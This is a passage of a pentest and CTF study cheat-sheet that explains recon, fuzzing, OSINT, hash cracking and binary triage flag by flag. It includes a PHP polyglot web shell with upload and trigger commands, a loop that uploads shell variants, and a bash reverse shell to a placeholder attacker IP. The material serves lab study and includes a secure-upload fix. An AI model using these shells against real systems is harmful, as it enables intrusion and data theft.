# Command Reference — Pentest, OSINT & CTF (PT1 study cheat-sheet)

> A tool-by-tool, flag-by-flag reference distilled from lab work. **No sensitive data** — every
> target-specific value is a placeholder. Copy a line, swap the placeholders, run it.
>
> **Placeholders used everywhere:**
> - `$IP` — target IP (`export IP=10.10.10.10` once, then reuse)
> - `<vhost>` — a virtual-host name (e.g. `app.thm`)
> - `<port>` — a port number
> - `<endpoint>` — a URL path (e.g. `/api/login.php`)
> - `<COOKIE>` — a session cookie value (e.g. `PHPSESSID=...`)
> - `<KEY>` / `<user>` / `<pass>` — credentials/tokens you supply
>
> Tip: `export IP=10.10.10.10` at the start of an engagement so every command below just works.

---

## 1. Reachability & host discovery

```bash
ping -c 2 $IP
```
| Part | Meaning |
|------|---------|
| `ping` | send ICMP echo requests to test reachability |
| `-c 2` | send exactly **2** packets then stop (default runs forever) |

> If ping fails, the host may just block ICMP — don't assume it's down. Scan with `nmap -Pn`.

## 2. Port scanning (nmap)

**Pass 1 — find every open TCP port, fast:**
```bash
nmap -p- --min-rate 2000 -T4 -Pn $IP
```
| Flag | Meaning | Why |
|------|---------|-----|
| `-p-` | scan **all 65,535** ports | services often hide outside the default top-1000 |
| `--min-rate 2000` | send ≥2000 packets/sec | turns a full scan from minutes → seconds (lab-safe) |
| `-T4` | timing template 4 (aggressive) | fast + accurate sweet spot for labs (`-T0` slow … `-T5` reckless) |
| `-Pn` | skip host discovery (assume up) | scans even when ICMP is filtered |

**Pass 2 — deep scan only the open ports:**
```bash
nmap -sV -sC -p 22,80,443 -Pn $IP
```
| Flag | Meaning | Why |
|------|---------|-----|
| `-p 22,80,443` | only these ports | no need to re-scan 65k; makes slow scans quick |
| `-sV` | service/version detection | fingerprints software + versions (feeds CVE lookups) |
| `-sC` | run default NSE scripts | grabs HTTP titles, **TLS cert names**, easy findings |
| `-A` | shortcut = `-sV -sC` + OS detect + traceroute | when you want everything at once |

**Other handy nmap:**
```bash
nmap -sU --top-ports 20 -Pn $IP        # -sU = UDP scan; --top-ports N = N most common
nmap -p- -sV -oN scan.txt $IP          # -oN file = save normal output to a file
```

## 3. TLS certificate inspection (find hostnames/vhosts)

```bash
openssl s_client -connect $IP:<port> </dev/null 2>/dev/null | openssl x509 -noout -subject
```
| Part | Meaning | Why |
|------|---------|-----|
| `openssl s_client -connect IP:PORT` | open a raw TLS connection, show the server cert | reveals the **CN / hostname** = your vhost |
| `</dev/null` | feed empty stdin | client closes right after handshake instead of hanging |
| `2>/dev/null` | discard stderr chatter | keep output clean |
| `openssl x509 -noout -subject` | parse cert, print only the Subject | `-noout` = don't dump raw cert; `-subject` = just the name |

Add `-dates` to also see validity: `... | openssl x509 -noout -subject -dates`.

## 4. Virtual hosts (name-based hosting)

Web ports often serve real content only when the `Host:` header matches an expected name.

**Persist a mapping (needs root):**
```bash
echo "$IP <vhost> <vhost2>" | sudo tee -a /etc/hosts
```
| Part | Meaning | Why |
|------|---------|-----|
| `echo "..."` | print the `IP  name…` line | the hosts-file format |
| `| sudo tee -a /etc/hosts` | append to root-owned file | `sudo echo >> file` fails (redirect runs as you); `tee -a` appends as root |

**Or override per-request (no root) — see curl `--resolve` below.**

### 4.1 Vhost fuzzing — and the baseline trap that hides the answer

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
     -H "Host: FUZZ.<domain>" -u http://$IP/ -fc 302 -t 25
```
`FUZZ` goes in the **header**, not the URL: the URL stays pinned to the IP and only the `Host:`
changes. Note `-u http://$IP/` — **`ffuf` has no `--resolve`**, so a hostname in the URL is handed
to the system resolver and every request dies at DNS before it leaves your machine.

**Baseline first — but baseline on the right field.** The usual probe prints status and size:

```bash
curl -s -o /dev/null -w '%{http_code}:%{size_download}\n' -H "Host: zzz.<domain>" http://$IP/
```

That is not always enough. Apache's default vhost and a real application can both answer
`302` with a zero-byte body, and then status+size cannot tell them apart:

| Host | Status | Size | `Location` |
|---|---|---|---|
| `zzz.olympus.thm` (miss) | 302 | 0 | `http://olympus.thm` — **absolute**, the default-vhost bounce |
| `chat.olympus.thm` (hit) | 302 | 0 | `login.php` — **relative**, an application redirect |

Filtering `-fc 302` throws the hit away. **Always include the redirect target in your probe:**

```bash
curl -s -o /dev/null -w '%{http_code}:%{size_download}:%{redirect_url}\n' -H "Host: FUZZ.<domain>" http://$IP/
```
In ffuf, either keep the 302s and read them, or filter on the bounce URL instead of the code:
```bash
ffuf ... -mc all -fr 'http://<domain>/?$'      # -fr = filter by regex on the response
ffuf ... -L                                     # or follow redirects so the bodies really differ
```

> **The rule:** a baseline is only as good as the field you compare. Status and size are the
> defaults because they are convenient, not because they are sufficient. When a sweep finds
> nothing, ask whether your filter can even **express** the difference you are hunting for,
> before you reach for a bigger wordlist.

### 4.2 Vhosts are not the only hidden site

If subdomain fuzzing comes up empty, the "other site" may not be a subdomain at all:

| Where else a second site hides | How you find it |
|---|---|
| `mod_userdir` — `/~<user>/` → `/home/<user>/public_html/` | shows up in a **directory** sweep, never a subdomain one |
| the **default vhost** docroot (`/var/www/html`) | what you get when `Host:` matches nothing |
| a path on the same vhost (`/old/`, `/v1/`) | ordinary directory sweep |

`/~webmaster/` is easy to dismiss as Debian packaging noise. **Open it anyway** — it is a
different filesystem tree, often running an app nobody remembers deploying.

## 5. curl — the web workhorse

### 5.1 Core flags (memorize this table)
| Flag | Meaning | When |
|------|---------|------|
| `-s` | silent (no progress bar) | always, for clean output |
| `-k` | accept invalid/self-signed TLS | any HTTPS lab box (never on real prod) |
| `-i` | include response **headers** in output | to read `Set-Cookie`, redirects, status |
| `-I` | **HEAD** request (headers only) | quick "does this exist?" check |
| `-X METHOD` | set HTTP method | POST/PUT/DELETE APIs |
| `-H 'K: V'` | add a request header | content-type, API keys, `Host` |
| `-d 'data'` | request body (implies POST) | send JSON / form data |
| `--data-urlencode 'k=v'` | body, value URL-encoded | values with `@ + & space` (emails!) |
| `-b 'k=v'` | send cookies | authenticated requests |
| `-c file` | save received cookies to a jar | keep a session across calls |
| `-F 'file=@path'` | multipart file upload | upload forms |
| `-L` | follow redirects | when a page 302s to real content |
| `--resolve host:port:ip` | pin hostname→IP for this request | vhosts without editing `/etc/hosts` |
| `-o file` / `-O` | save body to file / to remote filename | download responses |
| `-w '%{http_code}\n'` | print chosen response fields | scripting (status/size/timing) |

### 5.2 Common recipes

**Fetch a vhost by pinning (no /etc/hosts):**
```bash
curl -sk --resolve <vhost>:443:$IP https://<vhost>/
```
`--resolve <host>:<port>:<ip>` = "for this host+port, connect here" — sends the correct `Host`
header **and** TLS SNI, which is what vhosts require.

**See response headers (grab a session cookie):**
```bash
curl -sk -i --resolve <vhost>:443:$IP -X POST https://<vhost>/<endpoint> \
  -H 'Content-Type: application/json' \
  -d '{"username":"<user>","password":"<pass>"}'
```
`Content-Type: application/json` matters when the server does `json_decode()` — form-encoding won't parse.

**Authenticated request (reuse the cookie):**
```bash
curl -sk --resolve <vhost>:443:$IP -b '<COOKIE>' https://<vhost>/<endpoint>
```

**Send a custom header (API key, etc.):**
```bash
curl -sk --resolve <vhost>:443:$IP -X POST https://<vhost>/<endpoint> \
  -H 'X-Some-Header: <KEY>' -H 'Content-Type: application/json' -d '{...}'
```
> Note: some apps compare header **names case-sensitively** in code — match the exact casing you saw.

**POST a value safely (URL-encode it):**
```bash
curl -sk --resolve <vhost>:<port>:$IP -X POST https://<vhost>:<port>/<endpoint> \
  --data-urlencode 'email=<value-with-@>'
```
`--data-urlencode` percent-encodes special chars (`@`→`%40`) so the field arrives intact — plain
`-d` can corrupt them.

**Quick existence probe (status only):**
```bash
curl -sk -o /dev/null -w '%{http_code}\n' --resolve <vhost>:443:$IP https://<vhost>/<endpoint>
```
`-o /dev/null` throws away the body; `-w '%{http_code}'` prints just the status. Great in loops.

**Probe status *and* size together (the cheap way to spot a real route):**
```bash
curl -s -o /dev/null -w '%{http_code}:%{size_download}\n' -X POST \
  -H 'Content-Type: application/json' -d '{"a":"b"}' http://$IP/<endpoint>
```
When an app answers every wrong path with one identical error, the **size** is what separates a real
endpoint from noise — `500:42` for every miss, `500:56` for a route that actually exists. Status
codes alone tell you nothing there.

**Two requests on one connection (`--next`):**
```bash
curl -s -X POST -d '{"a":1}' -H 'Content-Type: application/json' http://$IP/<endpoint-a> \
  --next -s -X POST -d '{"b":2}' -H 'Content-Type: application/json' http://$IP/<endpoint-b>
```
`--next` starts a fresh request in the same curl run, reusing the keep-alive connection. Useful when
you suspect an app ties state to a connection — and useful for proving it does **not**.

**Send deliberately malformed JSON (see §16.5 — leaks stack traces):**
```bash
curl -s -X POST -H 'Content-Type: application/json' -d '"broken' http://$IP/<endpoint>
```

## 6. Content / directory discovery (fuzzing)

**ffuf:**
```bash
ffuf -u https://<vhost>/FUZZ -w /usr/share/wordlists/dirb/common.txt -H "Host: <vhost>" -mc 200,301,302,403 -t 40
```
| Flag | Meaning |
|------|---------|
| `-u URL` with `FUZZ` | `FUZZ` is the injection point (path, param, subdomain) |
| `-w wordlist` | wordlist to iterate |
| `-H "Host: ..."` | set headers (needed for vhosts, or for **vhost fuzzing**) |
| `-mc 200,301,302,403` | **match** these status codes |
| `-fc 404` | **filter out** these codes (hide noise) — alternative to `-mc` |
| `-fs <size>` | filter out a response size (kill uniform "not found" pages) |
| `-e .php,.txt` | append extensions to each word |
| `-t 40` | 40 concurrent threads (speed) |
| `-o out.json -of json` | save results |

**Fuzz file names with an extension:**
```bash
ffuf -u https://<vhost>/<dir>/FUZZ.php -w wordlist.txt -mc all -fc 404 -t 40
```

**gobuster (equivalent):**
```bash
gobuster dir -u https://<vhost>/ -w /usr/share/wordlists/dirb/common.txt -k -x php,txt -t 40
```
| Flag | Meaning |
|------|---------|
| `dir` | directory/file brute-force mode (`dns`/`vhost` also exist) |
| `-u` / `-w` | target URL / wordlist |
| `-k` | skip TLS verification (self-signed) |
| `-x php,txt` | try these extensions |
| `-t 40` | threads |

### 6.1 Fuzz the right thing — `FUZZ` is not only for paths

`FUZZ` is a plain placeholder: put it wherever the unknown is.

```bash
# path
ffuf -u http://$IP/FUZZ                          -w common.txt -fs 42
# JSON body PARAMETER NAME (FUZZ sits in the key position)
ffuf -u http://$IP/<endpoint> -X POST -H 'Content-Type: application/json' \
     -d '{"FUZZ":"test"}'                        -w common.txt -fs 52
# header NAME
ffuf -u http://$IP/<endpoint> -X POST -H 'FUZZ: test' -d '{}' -w common.txt -fs 56
# cookie name / query param
ffuf -u http://$IP/<endpoint> -H 'Cookie: FUZZ=test'   -w common.txt -fs 56
ffuf -u "http://$IP/<endpoint>?FUZZ=test"              -w common.txt -fs 56
# filename with a required extension
ffuf -u http://$IP/<endpoint> -X POST -H 'Content-Type: application/json' \
     -d '{"file_path":"FUZZ.yaml"}'              -w common.txt -fs 55
```

### 6.2 Three ways a sweep lies to you

**1 — Wrong method.** `app.post()` routes are invisible to a GET sweep: Express falls through to the
catch-all, so a POST-only endpoint looks exactly like a miss. **Sweep both methods.**

**2 — Wrong filter.** If an app never returns 404, `-fc 404` filters nothing and every word "hits".
Baseline a known-bad request first, then filter on its **size**:
```bash
curl -s -o /dev/null -w '%{size_download}\n' http://$IP/definitely-not-here   # -> 42
ffuf -u http://$IP/FUZZ -w common.txt -fs 42 -t 40
```
Get the baseline byte count right — filtering `-fs 53` when the real miss is 55 bytes returns a
screen of garbage that looks like findings.

**3 — Wrong wordlist.** `dirb/common.txt` is ordinary English: `admin`, `backup`, `login`. It cannot
find a route named `/api/nostromo`, a parameter named `file_path`, or a file named `100375.yaml`.
**Build a themed list from the target's own vocabulary** — every proper noun in the client JS, the
page text, the brief — and try it by hand:
```bash
for p in <word1> <word2> <word3>; do
  for m in GET POST; do
    r=$(curl -s -o /dev/null -w '%{http_code}:%{size_download}' -X $m \
        -H 'Content-Type: application/json' -d '{"a":"b"}' "http://$IP/$p")
    [ "$r" != "500:42" ] && echo "$m /$p -> $r"
  done
done
```
> When a sweep comes back empty, ask what your wordlist **assumed about the developer** before you
> reach for a bigger one. Developers name things after their app, not after your wordlist.

### 6.3 Error messages are an oracle

Different errors = different code branches. Two distinct messages usually mark the boundary between
**validation** and **the actual work**:

| Response | It means |
|---|---|
| `Not a YAML file path.` | input rejected **before** any I/O — validation failed |
| `Failed to read the file.` | validation passed, the read ran and failed — **the file does not exist** |

The second message is a free filesystem oracle: you can now test whether any path exists. But read
error strings as *"which branch ran"*, never as statements of fact — a message reading
`Science Officer Eyes Only` turned out to be plain `ENOENT` in costume, and cost hours of attacking
an authorisation gate that did not exist.

## 7. OSINT — finding leaked source & secrets

**Google dorks (targeted search-engine recon):**
```
site:github.com "<unique-string>"      # restrict to one domain + exact phrase
site:pastebin.com <company>            # paste-site leaks
intext:"<unique-string>"               # phrase anywhere in the page body
inurl:admin filetype:php               # words in the URL / specific file types
```
> **Method:** pivot on a **unique string** you already found (a custom header name, app name,
> developer handle) — follow it from the app into the target's public footprint.

**GitHub API — list commits (no auth for public repos):**
```bash
curl -s https://api.github.com/repos/<owner>/<repo>/commits | grep '"message"'
```
`| grep '"message"'` filters the JSON down to just commit-message lines. Look for messages like
"remove key", "fix creds", "cleanup".

**GitHub API — read one commit's diff (recover a "removed" secret):**
```bash
curl -s https://api.github.com/repos/<owner>/<repo>/commits/<sha>
```
Removed lines (the `-` side of the diff) still contain the old value. **Git history keeps deleted secrets.**

**Automated secret scanning (what pros run):**
```bash
trufflehog github --repo=https://github.com/<owner>/<repo>
gitleaks detect --source=<local-clone> -v
```

## 8. Insecure file upload → web shell (RCE)

**Concept:** if an upload validates only **magic bytes** (first few bytes) and keeps your filename,
prepend a valid image header to a script and name it `.php`.

**Magic bytes to remember:** PNG `89 50 4E 47` (`\x89PNG`) · JPG `FF D8 FF E0` · GIF `47 49 46 38` (`GIF8`) · BMP `42 4D` (`BM`).

**Build a polyglot shell (bash):**
```bash
printf '\x89PNG\r\n\x1a\n<?php system($_REQUEST["c"]); ?>' > shell.php
```
`printf` writes exact bytes (`\x89` etc.); the PHP runs whatever you pass in `?c=<cmd>`.

**Upload it with curl:**
```bash
curl -sk --resolve <vhost>:443:$IP -b '<COOKIE>' -F 'file=@shell.php' https://<vhost>/<upload-endpoint>
```
`-F 'file=@path'` sends a multipart upload; `file` is the form field name (match the app's).

**Trigger commands (RCE test → enumerate):**
```bash
curl -sk --resolve <vhost>:443:$IP 'https://<vhost>/<uploads-dir>/shell.php?c=id'
curl -sk --resolve <vhost>:443:$IP 'https://<vhost>/<uploads-dir>/shell.php?c=cat%20/path/to/config'
```
| Part | Meaning |
|------|---------|
| `?c=id` | `id` = who am I (classic RCE confirmation) |
| `%20` | URL-encoded space (raw spaces not allowed in URLs) |
| single-quoted URL | stops the shell interpreting `?` `&` |

**Cleanup after yourself (etiquette + OPSEC):**
```bash
curl -sk --resolve <vhost>:443:$IP 'https://<vhost>/<uploads-dir>/shell.php?c=rm%20/full/path/shell.php'
```

### 8.1 Test the handler the form actually posts to

An app can ship **two** upload files: a careful one and the one that runs. Fetching a validator
directly with no session and no file makes it print its whole decision tree:

```bash
curl -s http://$IP/upload.php
# Sorry, file already exists.
# Sorry, only JPG, JPEG, PNG & GIF files are allowed.
# Sorry, your file was not uploaded.
```
That is a free specification of the filter — but only of **that file's** filter. If the form posts
to `home.php`, the checks in `upload.php` never execute. Read the form's `action=` and attack that:

```bash
curl -s http://$IP/<page> | grep -oE '<(form|input|button)[^>]*'
```

**Enumerate extensions empirically** rather than guessing at bypasses:
```bash
for n in s.php s.phtml s.php5 s.PHP s.php.gif s.gif.php s.pHp; do
  printf 'GIF89a;\n<?php echo shell_exec($_REQUEST["c"]); ?>\n' > "$n"
  curl -s -b cookies.jar -F "fileToUpload=@$n;type=image/gif" -F "submit=1" http://$IP/<handler>
done
```
Then check what each one **became** on disk (a listing, a DB column, or the response). Often no
bypass is needed at all — the whitelist simply is not on that code path.

### 8.2 Renaming an upload is not sanitising it

A very common pattern, and a vulnerable one:
```php
$FileType = strtolower(pathinfo($_FILES["f"]["name"], PATHINFO_EXTENSION));
$name = md5(time()).'.'.$FileType;      // "random" name, ATTACKER-CONTROLLED extension
```
It controls the *name* and leaves the *type* to the attacker. Two separate bugs:

- **The extension is echoed back from the client.** Derive it server-side from verified content.
- **`md5(time())` is not random.** `time()` is public and second-granular: a whole day is 86,400
  MD5s (< 1 s to brute-force), and two uploads in the same second silently overwrite each other.

```bash
# confirm the scheme experimentally: upload, note the clock, read back the stored name
T0=$(date +%s); curl -s -F "fileToUpload=@probe.gif" ... ; T1=$(date +%s)
for t in $(seq $((T0-60)) $((T1+60))); do
  [ "$(printf '%s' $t | md5sum | cut -d' ' -f1)" = "<stored-hash>" ] && echo "md5(time()) confirmed: $t"
done
```

**The fix:**
```php
$allowed = ['image/jpeg'=>'jpg','image/png'=>'png','image/gif'=>'gif'];
$mime = (new finfo(FILEINFO_MIME_TYPE))->file($_FILES['f']['tmp_name']);
if (!isset($allowed[$mime])) { /* reject */ }
$name = bin2hex(random_bytes(16)) . '.' . $allowed[$mime];
```
…and disable PHP execution in the upload directory entirely. **Unguessable names need unguessable
inputs, not hashed public ones.**

> **Check you can REACH an upload before crafting a payload for it.** If the whole directory is
> `403` (Apache `Require all denied`), nothing you upload there is reachable whatever it contains.
> One `curl` against a file you know exists (`/img/img.jpg`) settles it in five seconds.

## 9. Credentials & hashes

**Identify a hash prefix:**
- `$2a$ / $2b$ / $2y$` → **bcrypt** (slow; cost factor is the number after, e.g. `$2y$10$`)
- `$1$` → md5crypt · `$5$` → sha256crypt · `$6$` → sha512crypt
- 32 hex chars → likely MD5 · 40 hex → SHA1

**Crack with hashcat:**
```bash
hashcat -m <mode> -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
| Flag | Meaning |
|------|---------|
| `-m <mode>` | hash type — **3200**=bcrypt, 0=MD5, 100=SHA1, 1800=sha512crypt |
| `-a 0` | attack mode 0 = straight (wordlist) |
| `hash.txt` | file with the hash(es) |
| `rockyou.txt` | the classic wordlist |
| `--show` | print already-cracked results |

**Crack with John (auto-detects type):**
```bash
john --format=bcrypt --wordlist=rockyou.txt hash.txt   # be explicit; autodetect can pick wrong
john --show --format=bcrypt hash.txt
john --session=<name> ...                              # REQUIRED for a 2nd concurrent job,
                                                       # else: "Crash recovery file is locked"
```
**`*2john` — turn any artefact into a crackable hash:**
```bash
ssh2john id_rsa > key.hash          # encrypted SSH private key -> passphrase
zip2john f.zip > z.hash             # password-protected archive
keepass2john f.kdbx > k.hash
# then: john --wordlist=rockyou.txt <hash>
```

> **Offline cracking is not login-page bruteforce.** Rooms that ban "bruteforcing any login page"
> still expect this: it runs on your machine, sends the target zero packets, and triggers no
> lockout. Know the difference and say which one you did.

**Verify a bcrypt guess without cracking (Python):**
```bash
python3 -c "import bcrypt; print(bcrypt.checkpw(b'<pass>', b'<hash>'))"
```
| Part | Meaning |
|------|---------|
| `python3 -c "..."` | run a one-line program |
| `bcrypt.checkpw(pw, hash)` | re-hash `pw` with the hash's salt/cost and compare → `True`/`False` |
| escape `$` as `\$` | so the shell doesn't expand `$2`, `$10` as variables |

> `rockyou.txt` is gzipped on Kali: `gunzip -k /usr/share/wordlists/rockyou.txt.gz` first.

## 10. Databases (after RCE / creds)

```bash
mysql -u <user> -p'<pass>' -e 'show databases;'                     # -e = run SQL and exit
mysql -u <user> -p'<pass>' <db> -e 'show tables;'
mysql -u <user> -p'<pass>' <db> -e 'select * from users;'
```
| Flag | Meaning |
|------|---------|
| `-u <user>` | DB username |
| `-p'<pass>'` | password (no space after `-p`; quote it) |
| `-e 'SQL'` | execute one statement non-interactively |
| `<db>` | database name (positional) |

> If `mysql` CLI is blocked for the web user, run the query **from a PHP script** you uploaded
> (`new mysqli(...)` + `query()`), then read the output over HTTP.

## 11. Shell upgrade & pivots (post-exploitation quick refs)

**Spawn a proper TTY from a dumb shell:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'    # then: Ctrl+Z, stty raw -echo, fg, enter
```
**Reverse shell (attacker listens, target connects back):**
```bash
# on attacker
nc -lvnp <port>                # -l listen, -v verbose, -n no DNS, -p port
# on target
bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1
```
**Serve/transfer files:**
```bash
python3 -m http.server <port>            # quick web server in current dir
wget http://<attacker-ip>:<port>/file    # pull to target
curl http://<attacker-ip>:<port>/file -o file
```

## 12. The methodology, on one screen

```
1. RECON        nmap -p- --min-rate 2000 -T4 -Pn  →  nmap -sV -sC -p <open>
                read TLS certs (openssl), HTTP titles, redirects, error pages
2. ENUMERATION  browse app; READ every JS file (deobfuscate it, §14); note endpoints/roles/headers
                baseline a wrong request, then fuzz by SIZE; sweep GET *and* POST (§6.2)
                build a THEMED wordlist from the app's own vocabulary before a bigger generic one
                real-time app? map socket namespaces/events, and check the direction (§15)
3. OSINT        pivot on a UNIQUE STRING → GitHub/dorks/paste sites → leaked secrets
4. EXPLOIT      cross a trust boundary: leaked cred, injection, traversal, upload, auth flaw
                app silent? attack the MIDDLEWARE, not the handler — malformed JSON (§16.5)
5. POST-EXPLOIT got file read? get a LISTING first (.git/index, /proc, syslog — §17)
                read configs+source, dump DBs, crack hashes, escalate user→admin→root
                shell? find / -perm -4000 and check what ISN'T stock (§19)
6. VERIFY       confirm each finding a 2nd way; separate VERIFIED from ASSUMED; keep dead ends
                a payload that "should" work and doesn't: re-test it before theorising
7. CLEAN UP     remove every shell, temp file, injected row and key you added — then PROVE
                your access is gone (§20.2)
```

**Recurring shape: one credential unlocks the next stage.** DB → hashes → crack one weak password
→ that password is reused on a second app → upload → RCE → SUID binary → user → backdoor → root.
At every step, ask *what does this let me read*, then *who else uses that value*.

## 13. Binary / static analysis & CTF file triage

For "here's a file, find the flag" challenges (RE, forensics, game hacking). **Static analysis by
default** — read the file as *data*; never run an unknown binary outside an isolated VM.

Placeholders: `<file>` = the sample, `<off>` = a byte offset (e.g. `0x5036600`), `<len>` = a length.

### 13.1 First questions (cheap, always run these first)

```bash
file <file>                 # what kind of file is it?
ls -l <file>                # size — a huge "code" file is mostly DATA (art/audio/levels)
sha256sum <file>            # record the fingerprint; prove you analysed exactly this file
```
| Tool | Does |
|------|------|
| `file` | guesses type from magic bytes (PE/ELF/ZIP/PNG…) |
| `ls -l` | byte size — a size that dwarfs the expected code hints at bundled assets |
| `sha256sum` | content hash; note it in your write-up |

### 13.2 The free win — search for a flag before anything clever

```bash
strings -a <file> | grep -iE "flag|THM\{|CTF\{"     # the 5-second first move on ANY CTF file
grep -aoE "THM\{[^}]*\}" <file>                       # faster + clean: prints only the flag
```
| Part | Meaning | Why |
|------|---------|-----|
| `strings` | prints runs of printable text from a binary | menus, paths, messages — and sometimes the flag |
| `strings -a` | scan the **entire** file, not just "data" sections | flags often sit outside normal sections; **always use `-a`** |
| `strings -n <N>` | only text ≥ N chars | `-n 25` filters out accidental short noise |
| `grep -a` | treat a binary as text | else grep just says "Binary file matches" |
| `grep -o` | print only the matched part, not the whole binary "line" | avoids a screenful of garbage around the hit |
| `grep -E` | extended regex (`\|`, `{}`, `[]`, `()` work) | `THM\{[^}]*\}` = `THM{`, non-`}` chars, `}` |
| `grep -i` | case-insensitive | catch `flag`/`FLAG` |
| `grep -b` | print each match's **byte offset** | tells you *where* in the file it lives |

> `grep -aoE "THM\{[^}]*\}" <file>` is ~35× faster than `strings … | grep …` because it never
> builds the million-line text haystack — it scans raw bytes. A magic-byte/string match is a
> **candidate, not a conclusion** — sanity-check it.

### 13.3 Is a slow command stuck? — measure & show progress

```bash
time ( strings -a <file> | grep "THM{" )   # how long does it REALLY take? (user=cpu, 100%cpu=cpu-bound)
pv <file> | strings -a | grep "THM{"       # live progress bar reading the file (pv = pipe viewer)
strings -a <file> | pv -l | grep "THM{"    # -l counts LINES flowing through instead of bytes
```
Rescue a job you already started (second terminal — don't kill it):
```bash
pgrep -a strings        # find the running process id (PID)
pv -d <PID>             # -d = watch that PID's open files and how far it has read
```
| Flag | Meaning |
|------|---------|
| `time ( … )` | wall/CPU time of the whole pipeline; `100% cpu` ⇒ CPU-bound, not disk |
| `pv <file>` | progress bar + throughput + ETA for data flowing through a pipe |
| `pv -l` | count lines instead of bytes (no % when total is unknown, but proves it's alive) |
| `pv -d <PID>` | attach to an already-running process and watch its read progress |
| `grep --line-buffered` | flush each match immediately (changes *when* you see hits, not speed) |

### 13.4 Look at the structure (executables)

```bash
objdump -h <file>          # -h = section headers ("table of contents": .text/.data/.rdata/…)
```
- Standard sections: `.text` (code), `.data`/`.rdata` (constants). **Non-standard section names are
  where you look first** (e.g. a `pck` section ⇒ a Godot game archive).

### 13.5 Hexdump & numbers

```bash
xxd <file> | less                 # raw bytes as hex + ASCII
xxd -s <off> -l <len> <file>      # -s = start at offset, -l = show <len> bytes
xxd -s -12 <file>                 # -s -12 = start 12 bytes BEFORE the end (read a trailer)
python3 -c "print(0x5036600)"     # hex -> decimal
python3 -c "print(hex(93001116))" # decimal -> hex
python3 -c "print(int.from_bytes(bytes.fromhex('14008800'),'little'))"  # little-endian bytes -> int
```
> **Little-endian:** Intel stores multi-byte numbers least-significant-byte-first. Bytes `14 00 88 00`
> mean `0x00880014`, **not** `0x14008800`. Reverse the byte pairs, then read normally.

### 13.6 Fingerprint the engine / toolchain (turn RE into "read a spec")

Identify what built it — its file formats are then documented. Three angles; agree across ≥2.

**A — let the file talk (know nothing yet): read its real human text**
```bash
# real sentences / error messages (filters out machine code that looks like letters):
strings -a -n 25 <file> | grep -E "^[A-Za-z][A-Za-z0-9 ,.'()-]+$" | sort -u | head
# the bill of materials — copyright banners share a shape: YEAR-YEAR|present, Names
strings -a -n 10 <file> | grep -iE "[0-9]{4}(-present|-[0-9]{4}), " | sort -u
```
> Also flags outdated/vulnerable bundled libraries (zlib, libpng, FreeType…). Don't trust raw
> frequency (`sort|uniq -c|sort -rn`) on a binary — machine code counts as fake "words".

**B — test a signature checklist (you have a suspicion)**
```bash
for m in GDPC godot UnityPlayer MonoBleedingEdge PyInstaller GameMaker UPX!; do
  echo "$m: $(grep -a -c "$m" <file>)"
done
```
- `for m in A B C; do … done` = loop, each item into `$m`; `$( … )` = paste a command's output.
- `grep -a -c` = count matching **lines** (not occurrences). Real occurrence count:
  `grep -a -o "<m>" <file> | wc -l`. For fingerprinting, **zero vs non-zero is the whole signal.**

| Marker(s) | Built with |
|-----------|------------|
| `GDPC`, `godot`, `GDScript` | Godot |
| `UnityPlayer`, `MonoBleedingEdge`, `Assembly-CSharp` | Unity |
| `UE4`, `UnrealEngine`, `.pak` | Unreal |
| `PyInstaller`, `MEIPASS`, `python3xx.dll` | Python (PyInstaller) |
| `GameMaker`, `YoYo Games` | GameMaker |
| `Electron`, `app.asar`, `node_modules` | Electron |
| `UPX!` | not an engine — the file is **packed** (`upx -d <file>` to unpack) |

**C — packing / encryption check**
```bash
binwalk -E <file>          # -E = entropy graph. Uniform ~8.0 everywhere ⇒ packed/encrypted
binwalk <file>             # scan for embedded file signatures (EXPECT false positives — verify!)
upx -d <file> -o out.bin   # decompress a UPX-packed binary
```
> High entropy ≠ encrypted. **Compressed** data (PNG/OGG/zstd) looks just as random. Confirm with a
> magic-byte signature or by actually parsing the format.

### 13.7 Find files hidden inside a file (by their magic bytes)

When an index/table-of-contents is encrypted, the **contents often aren't** — hunt them directly:
```bash
grep -aob 'PK'    <file> | head    # ZIP entries         (-o only match, -b byte offset)
grep -aob 'RSRC'  <file> | head    # Godot resource
grep -aob 'GDSC'  <file> | head    # compiled GDScript
grep -aob '\x89PNG' <file> | head  # PNG image
```
Common magic bytes: PNG `89 50 4E 47` · JPG `FF D8 FF` · GIF `GIF8` · ZIP `PK` (`50 4B`) · 7-Zip `37 7A` · ELF `7F 45 4C 46` · PE `MZ`.

> **Security lesson:** a lock on the *index* is not a lock on the *content*. When you meet a control,
> ask precisely **what** it covers — the gap is usually right beside it.

### 13.8 Reflex order for an unknown CTF binary

```
1. file <f>                                   what am I holding?
2. sha256sum <f>                              record it
3. strings -a <f> | grep -iE "flag|THM\{|CTF\{"   the free win
4. strings -a <f> | less                      skim: URLs, C:\ paths, product names, errors
5. objdump -h <f>                             any non-standard section?
6. FINGERPRINT (2 ways): copyright text  +  signature checklist (GDPC/UnityPlayer/PyInstaller/UPX!/PK)
7. grep -aob '<magic>' <f>                    hunt embedded files by signature
8. only now: Ghidra / radare2 (disassembly)
```
Steps 1–7 are cheap and solve a surprising share of challenges.

## 14. Reading client-side JavaScript (including obfuscated)

A single-page app ships its own API documentation to you. **Read the JS before attacking anything.**

```bash
curl -s http://$IP/ | grep -oE '<script[^>]*src="[^"]+"'   # find the bundles
curl -s http://$IP/<bundle>.js -o app.js && wc -c app.js
grep -oE "'[^']{4,}'" app.js | sort -u | head -40          # readable strings, deduped
grep -c "emit" app.js                                       # does the client ever SEND anything?
grep -oE '[A-Za-z0-9+/]{16,}={0,2}' app.js | while read b; do echo "$b" | base64 -d 2>/dev/null; echo; done
```

| Command | Why |
|---|---|
| `grep -oE "'[^']{4,}'"` | pulls quoted string literals out of minified code without a parser |
| `grep -c "emit"` | a client that never emits means the socket is **output only** — the input is elsewhere |
| `base64 -d` | client bundles hide secrets in `atob("...")` constantly; decode every long blob |

### 14.1 Obfuscated JS (obfuscator.io pattern)

Recognise it: hex identifiers (`_0x42b1`), one array holding every string, and a `while(!![])` loop
at the top. It is **not encryption** — three tricks stacked:

1. every string moved into one array, each use replaced by an index lookup
2. the array is **rotated** at load time (`push(shift())`) until a checksum matches, so index → string
   cannot be read off the page
3. identifiers renamed to noise

`!![]` is `true`; `![]` is `false`. Nothing is removed — the strings are all still in the file.

**Lazy read** (works surprisingly often): just grep the string array, as above.

**Proper read — let the code decode itself.** Extract only the string-array function, the accessor
